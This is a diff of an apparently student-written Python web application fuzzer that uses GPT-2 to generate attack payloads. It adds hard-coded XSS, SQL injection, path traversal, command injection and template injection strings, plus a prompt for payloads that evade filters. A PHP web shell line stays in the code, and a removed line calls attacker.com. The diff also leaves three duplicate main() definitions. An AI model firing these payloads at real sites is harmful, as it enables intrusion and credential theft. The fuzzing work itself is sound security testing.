@@ -49,83 +49,58 @@ class Config:
     MIN_SAMPLES_PER_CLASS = 5
     PAYLOAD_GEN_MODEL = "payload_generator.pkl"
     MAX_PAYLOAD_LENGTH = 100
-    TRAINING_EPOCHS = 3
+    TRAINING_EPOCHS = 5
     TEST_SIZE = 0.2
     RANDOM_STATE = 42
     EXPLOITDB_PAYLOAD_LIMIT = 20
     MIN_PAYLOADS = 3
     MAX_PAYLOADS = 7
-    ML_PAYLOADS_FILE = "C:\\Users\\LOKESH\\Desktop\\Web Application Fuzzer\\WEBFUZZER\\\ml_payloads.txt"
-
-class ExploitDBInterface:
-    def __init__(self):
-        self.searchsploit_path = "/usr/bin/searchsploit"
-        self.exploitdb_url = "https://www.exploit-db.com/"
-        
-    def search_exploits(self, keywords: list, limit: int = 10) -> list:
-        """Search ExploitDB using searchsploit command line tool"""
-        try:
-            result = subprocess.run(
-                [self.searchsploit_path, "-j"] + keywords,
-                capture_output=True,
-                text=True
-            )
-            
-            if result.returncode != 0:
-                logger.error(f"Searchsploit failed: {result.stderr}")
-                return []
-                
-            data = json.loads(result.stdout)
-            exploits = data.get('RESULTS_EXPLOIT', [])
-            return [self._clean_exploit(e) for e in exploits[:limit]]
-            
-        except Exception as e:
-            logger.error(f"ExploitDB search error: {e}")
-            return []
-    
-    def _clean_exploit(self, exploit: dict) -> dict:
-        """Clean and standardize exploit data"""
-        return {
-            'id': exploit.get('EDB-ID'),
-            'title': exploit.get('Title'),
-            'type': exploit.get('Type'),
-            'platform': exploit.get('Platform'),
-            'date': exploit.get('Date'),
-            'author': exploit.get('Author'),
-            'path': exploit.get('Path')
-        }
-    
-    def fetch_exploit_content(self, path: str) -> str:
-        """Fetch the content of a specific exploit"""
-        try:
-            result = subprocess.run(
-                [self.searchsploit_path, "-p", path],
-                capture_output=True,
-                text=True
-            )
-            return result.stdout if result.returncode == 0 else ""
-        except Exception as e:
-            logger.error(f"Failed to fetch exploit content: {e}")
-            return ""
+    ML_PAYLOADS_FILE = "C:\\Users\\LOKESH\\Desktop\\Web Application Fuzzer\\WEBFUZZER\\ml_payloads.txt"
+    MODEL_DIR = "model_versions"
+    PAYLOADS_STORAGE_FILE = "generated_payloads.txt"
 
 class PayloadGenerator:
-    """Payload generator that learns patterns from the dataset"""
+    """Payload generator that produces realistic attack scripts/payloads"""
     def __init__(self):
-        # Initialize tokenizer with proper settings for generation
+        # Initialize GPT-2 model
         self.tokenizer = GPT2Tokenizer.from_pretrained('gpt2')
         self.tokenizer.pad_token = self.tokenizer.eos_token
-        self.tokenizer.padding_side = 'left'  # Critical for generation
-        
         self.model = GPT2LMHeadModel.from_pretrained('gpt2')
         self.model.eval()
         
-        # Payload safety configuration
-        self.forbidden_commands = [
-            'rm -rf', 'format c:', 'shutdown', 
-            'delete from', 'drop table', 'shutdown',
-            'halt', 'reboot', 'poweroff'
-        ]
-        
+        # Initialize payload templates - THIS WAS MISSING IN YOUR ORIGINAL CODE
+        self.payload_templates = {
+            'XSS': [
+                '<script>alert(1)</script>',
+                '<img src=x onerror=alert(1)>',
+                '<svg/onload=alert(1)>',
+                'javascript:alert(1)',
+                '<body onload=alert(1)>'
+            ],
+            'SQLi': [
+                "' OR 1=1 --",
+                "' OR '1'='1",
+                "admin'--",
+                "1' ORDER BY 1--",
+                "1' UNION SELECT null, username, password FROM users--"
+            ],
+            'PathTraversal': [
+                '../../../../etc/passwd',
+                '..%2F..%2F..%2Fetc%2Fpasswd',
+                '%2e%2e%2f%2e%2e%2fetc%2fpasswd'
+            ],
+            'CommandInjection': [
+                '; ls -la',
+                '| cat /etc/passwd',
+                '`id`',
+                '$(whoami)'
+            ],
+            'SSTI': [
+                '{{7*7}}',
+                '${7*7}',
+                '<%= 7*7 %>'
+            ]
+        }
         # Will be populated from dataset analysis
         self.common_patterns = []
         self.ml_payloads = []
@@ -136,6 +111,72 @@ class PayloadGenerator:
             ngram_range=(2, 4),
             max_features=50
         )
+        # Payload safety configuration
+        self.forbidden_commands = [
+            'rm -rf', 'format c:', 'shutdown', 
+            'delete from', 'drop table', 'shutdown',
+            'halt', 'reboot', 'poweroff'
+        ]
+        
+        # Storage for generated payloads
+        self.generated_payloads = set()
+        self._load_existing_payloads()
+
+    def _load_existing_payloads(self):
+        """Load previously generated payloads from file"""
+        try:
+            if os.path.exists(Config.PAYLOADS_STORAGE_FILE):
+                with open(Config.PAYLOADS_STORAGE_FILE, 'r') as f:
+                    for line in f:
+                        self.generated_payloads.add(line.strip())
+                logger.info(f"Loaded {len(self.generated_payloads)} existing payloads from storage")
+        except Exception as e:
+            logger.error(f"Error loading existing payloads: {e}")
+
+    def _save_payloads(self, payloads: List[str]):
+        """Save payloads to file, maintaining unique entries with duplicate analysis"""
+        try:
+            # Load existing payloads if file exists
+            existing_payloads = set()
+            if os.path.exists(Config.ML_PAYLOADS_FILE):
+                with open(Config.ML_PAYLOADS_FILE, 'r') as f:
+                    existing_payloads = {line.strip() for line in f.readlines()}
+            
+            # Find new unique payloads
+            new_payloads = set(payloads) - existing_payloads
+            
+            if not new_payloads:
+                logger.info("No new payloads to save - all were duplicates")
+                return
+            
+            # Remove any duplicates from current generation
+            unique_new_payloads = list(set(payloads))
+            
+            # Count duplicates found
+            duplicates = len(payloads) - len(unique_new_payloads)
+            if duplicates > 0:
+                logger.info(f"Removed {duplicates} duplicate payloads from current generation")
+            
+            # Count duplicates against existing file
+            duplicates_from_file = len(set(payloads) & existing_payloads)
+            if duplicates_from_file > 0:
+                logger.info(f"Found {duplicates_from_file} duplicates that already exist in {Config.ML_PAYLOADS_FILE}")
+            
+            # Save all unique payloads (existing + new)
+            all_payloads = existing_payloads.union(unique_new_payloads)
+            
+            # Write back to file (this overwrites and removes duplicates)
+            with open(Config.ML_PAYLOADS_FILE, 'w') as f:
+                for payload in all_payloads:
+                    f.write(f"{payload}\n")
+            
+            logger.info(f"Saved {len(new_payloads)} new payloads to {Config.ML_PAYLOADS_FILE} (total: {len(all_payloads)})")
+            self.ml_payloads = list(all_payloads)
+            
+        except Exception as e:
+            logger.error(f"Failed to save payloads: {e}")
+
+
 
     def analyze_dataset(self, dataset: pd.DataFrame):
         """Analyze the dataset to learn payload patterns"""
@@ -216,25 +257,47 @@ class PayloadGenerator:
                                min(num_samples, 7))
 
 
-    def generate_payloads(self, num_samples: int = 5) -> List[str]:
-        """Generate payloads based on learned patterns"""
+    def generate_payloads(self, context: str = None, num_samples: int = 5) -> List[str]:
+        """Generate realistic attack payloads"""
         try:
-            if not self.common_patterns:
-                logger.warning("No patterns learned - using fallback generation")
-                return self._generate_fallback_payloads(num_samples)
+            if not context:
+                payloads = self._generate_from_templates(num_samples)
+            else:
+                payload_type = self._get_payload_type(context)
+                templates = self.payload_templates.get(payload_type, [])
+                
+                if not templates:
+                    payloads = self._generate_from_templates(num_samples)
+                else:
+                    seed_payloads = random.sample(templates, min(3, len(templates)))
+                    prompt = self._create_generation_prompt(payload_type, seed_payloads)
+                    generated = self._generate_with_gpt2(prompt, num_samples)
+                    payloads = [p for p in generated if self._validate_payload(p)]
+                    
+                    if len(payloads) < num_samples:
+                        payloads.extend(self._generate_from_templates(num_samples - len(payloads)))
             
-            # Generate using learned patterns
-            prompts = [
-                f"Generate web security test payload using patterns like: {random.choice(self.common_patterns)}"
-                for _ in range(min(Config.MAX_PAYLOADS, max(Config.MIN_PAYLOADS, num_samples)))
-            ]
+            # Filter out duplicates and save
+            unique_payloads = list(set(payloads))[:num_samples]
+            self._save_payloads(unique_payloads)
             
+            return unique_payloads
+            
+        except Exception as e:
+            logger.error(f"Payload generation failed: {e}")
+            return self._generate_from_templates(num_samples)
+        
+
+
+    def _generate_with_gpt2(self, prompt: str, num_samples: int) -> List[str]:
+        """Generate payloads using GPT-2"""
+        try:
             inputs = self.tokenizer(
-                prompts,
+                prompt,
                 return_tensors='pt',
-                padding=True,
+                max_length=512,
                 truncation=True,
-                max_length=30
+                padding=True
             )
             
             with torch.no_grad():
@@ -242,43 +305,111 @@ class PayloadGenerator:
                     input_ids=inputs['input_ids'],
                     attention_mask=inputs['attention_mask'],
                     max_length=Config.MAX_PAYLOAD_LENGTH,
-                    num_return_sequences=1,
+                    num_return_sequences=num_samples,
                     do_sample=True,
                     top_k=50,
+                    top_p=0.95,
+                    temperature=0.7,
                     pad_token_id=self.tokenizer.eos_token_id
                 )
                 
-                # Process and validate generated payloads
-                generated = []
-                for i, output in enumerate(outputs):
-                    payload = self.tokenizer.decode(output, skip_special_tokens=True)
-                    payload = payload.replace(prompts[i], "").strip()
-                    
-                    # Extract first line and clean special chars
-                    payload = payload.split('\n')[0]
-                    payload = re.sub(r'[^\x20-\x7E]', '', payload)
-                    
-                    if payload and self._validate_payload(payload):
-                        generated.append(payload)
-                
-                return generated[:num_samples]
-                
+            generated = []
+            for output in outputs:
+                text = self.tokenizer.decode(output, skip_special_tokens=True)
+                payload = text.split('Payload:')[-1].strip()
+                payload = payload.split('\n')[0].strip('"\'')
+                generated.append(payload)
+            
+            return generated
+            
         except Exception as e:
-            logger.error(f"Payload generation failed: {e}")
+            logger.error(f"GPT-2 generation failed: {e}")
+            return []
+        
+    def _create_generation_prompt(self, payload_type: str, examples: List[str]) -> str:
+        """Create a prompt for GPT-2 generation"""
+        prompt = f"""
+        Generate realistic {payload_type} attack payloads that could bypass security filters.
+        The payloads should be functional but look like normal user input where possible.
+        
+        Examples:
+        {', '.join(examples)}
+        
+        Generate payloads in this format:
+        Payload: [the actual payload]
+        """
+        return prompt.strip()
+
+    def _generate_from_templates(self, num_samples: int) -> List[str]:
+        """Generate payloads from templates"""
+        all_templates = []
+        for templates in self.payload_templates.values():
+            all_templates.extend(templates)
+        
+        if not all_templates:
             return self._generate_fallback_payloads(num_samples)
         
+        return random.sample(all_templates, min(num_samples, len(all_templates)))
+
+    def _get_payload_type(self, context: str) -> str:
+        """Determine payload type from context"""
+        context_lower = context.lower()
+        if 'sql' in context_lower:
+            return 'SQLi'
+        elif 'xss' in context_lower or 'cross-site' in context_lower:
+            return 'XSS'
+        elif 'path' in context_lower or 'traversal' in context_lower:
+            return 'PathTraversal'
+        elif 'command' in context_lower or 'os' in context_lower:
+            return 'CommandInjection'
+        elif 'template' in context_lower:
+            return 'SSTI'
+        return 'XSS'    
+
     def _generate_fallback_payloads(self, num_samples: int) -> List[str]:
-        """Fallback payload generation when no patterns are learned"""
+        """Generate fallback payloads"""
         common_payloads = [
             "' OR 1=1 --",
             "<script>alert(1)</script>",
             "../../etc/passwd",
-            "| ls -la",
-            "<?php system($_GET['cmd']); ?>",
-            "%0D%0ALocation:%20javascript:alert(1)",
-            "${jndi:ldap://attacker.com/x}"
+            "; ls -la",
+            "<?php system($_GET['cmd']); ?>"
         ]
         return random.sample(common_payloads, min(num_samples, len(common_payloads)))
+
+    def clean_duplicate_payloads(self):
+        """Analyze and remove duplicate payloads from the storage file"""
+        try:
+            if not os.path.exists(Config.ML_PAYLOADS_FILE):
+                logger.info("No payloads file found to clean")
+                return False
+                
+            # Read all payloads
+            with open(Config.ML_PAYLOADS_FILE, 'r') as f:
+                payloads = [line.strip() for line in f.readlines()]
+            
+            # Count duplicates
+            original_count = len(payloads)
+            unique_payloads = list(set(payloads))
+            new_count = len(unique_payloads)
+            duplicates_removed = original_count - new_count
+            
+            if duplicates_removed > 0:
+                # Write back unique payloads
+                with open(Config.ML_PAYLOADS_FILE, 'w') as f:
+                    for payload in unique_payloads:
+                        f.write(f"{payload}\n")
+                
+                logger.info(f"Removed {duplicates_removed} duplicate payloads from {Config.ML_PAYLOADS_FILE}")
+                self.ml_payloads = unique_payloads
+                return True
+            else:
+                logger.info("No duplicates found in payloads file")
+                return False
+                
+        except Exception as e:
+            logger.error(f"Error cleaning duplicate payloads: {e}")
+            return False
 
     def _generate_from_finetuned(self, context: str, num_samples: int = 5) -> list:
         """Generate actual payloads with proper attention handling"""
@@ -328,15 +459,30 @@ class PayloadGenerator:
                                min(num_samples, len(self.payload_templates[payload_type])))
 
     def _validate_payload(self, payload: str) -> bool:
-        """Validate payload safety and format"""
+        """Validate payload safety and effectiveness"""
         if not payload or len(payload) > Config.MAX_PAYLOAD_LENGTH:
             return False
             
         payload_lower = payload.lower()
-        return not any(
-            cmd in payload_lower 
-            for cmd in self.forbidden_commands
-        ) and any(c in payload for c in ["'", '"', "<", ">", "/", "\\", "|", "&", "%"])
+        
+        # Check for forbidden commands
+        if any(cmd in payload_lower for cmd in self.forbidden_commands):
+            return False
+            
+        # Check for at least one malicious pattern
+        malicious_patterns = {
+            'XSS': ['<script>', 'onerror=', 'javascript:', 'svg/onload'],
+            'SQLi': ["' or", "--", "union select", "1=1"],
+            'PathTraversal': ['../', '..\\', '%2e%2e%2f'],
+            'CommandInjection': [';', '|', '`', '$('],
+            'SSTI': ['{{', '${', '<%=']
+        }
+        
+        for _, patterns in malicious_patterns.items():
+            if any(p in payload_lower for p in patterns):
+                return True
+                
+        return False
 
     def fine_tune(self, payload_data: Dict[str, int]) -> bool:
         """Fine-tune the generator on successful payloads"""
@@ -393,9 +539,12 @@ class PayloadGenerator:
         return 'SQL injection'  # default
 
     def analyze_and_generate_payloads(self, dataset: pd.DataFrame) -> List[str]:
-        """Analyze dataset and generate new payloads"""
+        """Analyze dataset and generate new payloads with duplicate handling"""
         try:
             logger.info("Analyzing dataset for payload generation...")
+            
+            # First clean any existing duplicates
+            self.clean_duplicate_payloads()
             
             # 1. Extract patterns from successful payloads
             patterns = self._extract_patterns(dataset)
@@ -410,7 +559,7 @@ class PayloadGenerator:
             all_payloads = list(set(exploitdb_payloads + generated_payloads))
             valid_payloads = [p for p in all_payloads if self._validate_payload(p)]
             
-            # Save to file
+            # Save to file (with duplicate handling)
             self._save_payloads(valid_payloads)
             
             return valid_payloads
@@ -774,6 +923,101 @@ def main():
         
         # Initialize payload generator and analyze dataset
         payload_gen = PayloadGenerator()
+        new_payloads = payload_gen.analyze_and_generate_payloads(dataset)
+        if new_payloads:
+            logger.info(f"Generated {len(new_payloads)} new payloads based on dataset analysis")
+        
+        # Preprocess data
+        try:
+            X, y, preprocessor = preprocess_data(dataset)
+        except Exception as e:
+            logger.error(f"Data preprocessing failed: {e}")
+            return
+        
+        # Train models
+        iso_model, rf_model, payload_gen = train_models(X, y, preprocessor, payload_data)
+        if iso_model is None or rf_model is None:
+            logger.error("Model training failed - exiting")
+            return
+        
+        # Save models
+        if not save_models(iso_model, rf_model, preprocessor, payload_gen):
+            logger.error("Failed to save models - exiting")
+            return
+        
+        logger.info("\n=== Model training completed successfully ===")
+        
+        # Demonstrate payload generation
+        if payload_gen:
+            logger.info("\nPayload Generation Demo:")
+            contexts = ["XSS attack", "SQL injection", "path traversal"]
+            for context in contexts:
+                logger.info(f"\nPayloads for '{context}':")
+                payloads = payload_gen.generate_payloads(context, num_samples=2)
+                for i, payload in enumerate(payloads, 1):
+                    logger.info(f"{i}. {payload}")
+    
+    except KeyboardInterrupt:
+        logger.info("\nProcess interrupted by user")
+    except Exception as e:
+        logger.error(f"\n!!! Critical error in main execution: {e}")
+    finally:
+        if 'payload_gen' in locals():
+            del payload_gen  # Clean up GPU memory
+        torch.cuda.empty_cache()
+
+def main():
+    """Test the payload generator"""
+    try:
+        logging.basicConfig(
+            level=logging.INFO,
+            format='%(asctime)s - %(levelname)s - %(message)s'
+        )
+        
+        logger.info("Starting payload generator test...")
+        generator = PayloadGenerator()
+        
+        # Test generation for different types
+        contexts = [
+            "XSS attack",
+            "SQL injection",
+            "Path traversal",
+            "Command injection",
+            "Server-side template injection"
+        ]
+        
+        for context in contexts:
+            logger.info(f"\nGenerating payloads for: {context}")
+            payloads = generator.generate_payloads(context, 3)
+            for i, payload in enumerate(payloads, 1):
+                logger.info(f"{i}. {payload}")
+        
+        logger.info("\nPayload generation test completed successfully")
+        
+    except Exception as e:
+        logger.error(f"Error in main: {e}")
+
+if __name__ == "__main__":
+    main()
+
+def main():
+    """Updated main function with duplicate payload handling"""
+    try:
+        logger.info("Starting model training process...")
+        
+        # Load dataset
+        dataset, payload_data = load_dataset()
+        if dataset is None:
+            logger.error("Failed to load dataset - exiting")
+            return
+        
+        # Initialize payload generator
+        payload_gen = PayloadGenerator()
+        
+        # First clean any existing duplicates
+        payload_gen.clean_duplicate_payloads()
+        
+        # Analyze dataset and generate payloads
         new_payloads = payload_gen.analyze_and_generate_payloads(dataset)
         if new_payloads:
             logger.info(f"Generated {len(new_payloads)} new payloads based on dataset analysis")
